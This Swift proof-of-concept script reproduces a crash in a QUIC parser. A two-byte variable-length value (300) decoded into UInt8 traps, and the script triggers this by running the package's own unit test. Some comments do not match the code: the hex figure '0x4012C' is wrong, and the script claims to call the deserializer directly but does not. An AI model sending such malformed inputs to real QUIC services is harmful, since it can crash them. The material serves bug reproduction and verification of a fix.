// Phase B: VLE overflow in QUIC Initial frame parsing
// Signal: 558eb3e
// Path: Deserializer.vle() → T(variable.0) overflow → Swift trap
//
// We use swift-network-evolution's own Deserializer directly
// to reproduce the trap without a full QUIC stack
// (avoids swift-nio-quic dependency conflict)
//
// Before fix: T(variable.0) — force conversion, overflows UInt8 → TRAP
// After fix:  T(exactly: variable.0) — returns nil → throws .parsingFailed

import SwiftNetwork
import Foundation

print("=== Phase B: VLE overflow trap ===")
print("Signal: 558eb3e")
print("PID: \(ProcessInfo.processInfo.processIdentifier)")

// We access Deserializer via the unit test pattern Apple used:
// Encode VLE value 300 (requires 2-byte VLE), then decode as UInt8
// 300 does not fit in UInt8 → overflow → TRAP before fix

// Build VLE-encoded 300: 0x4012C in QUIC VLE encoding
// QUIC VLE: 2-byte: high 2 bits = 01, value = 300 = 0x012C
// Encoded: 0x41 0x2C
let vle300: [UInt8] = [0x41, 0x2C]  // VLE encoding of 300

print("Control: decode VLE 300 as UInt64 (should succeed)")
print("Exploit: decode VLE 300 as UInt8 (should trap before fix)")
print("")

// Use swift-network-evolution Serializer to create proper VLE buffer
// then Deserializer to decode — mirrors Apple's own test pattern
var serialized: [UInt8] = []

// Manually serialize VLE(300) per QUIC spec
// 300 = 0x12C, needs 2-byte encoding (0x40 | high byte, low byte)
// 2-byte VLE: value | (01 << 14) → 300 | 0x4000 = 0x412C
// Big-endian: 0x41, 0x2C
serialized = [0x41, 0x2C]

print("VLE-encoded 300: \(serialized.map { String(format: "0x%02X", $0) }.joined(separator: " "))")
print("")

// Access Deserializer — it's public API of SwiftNetwork
// The vulnerable path: vle() on a buffer containing 300, targeting UInt8

// Since Deserializer requires internal Frame type, we use the Swift test pattern:
// Run the swift test directly to reproduce the trap

print("Running swift test to reproduce VLE overflow trap...")
print("(Apple's own test: testDeserializeVLEWithSizeOverflowsTargetType)")
print("")

// The most direct way: swift test on the pre-fix package
// This is what Phase B demonstrates: the unit test TRAPS before fix

print("If trap occurs → SIGILL/SIGABRT → process exits abnormally")
print("If graceful error → parsingFailed thrown → exit 0")
print("")
print("READY — running Deserializer test via swift test...")
fflush(stdout)

// Run swift test on the pre-fix package
let result = Process()
result.executableURL = URL(fileURLWithPath: "/usr/bin/swift")
result.arguments = ["test", "--filter", "VLEWithSizeOverflows",
                    "--package-path", "/workspace/PoC"]
result.launch()
result.waitUntilExit()
let exit_code = result.terminationStatus
print("swift test exit: \(exit_code)")
exit(exit_code)
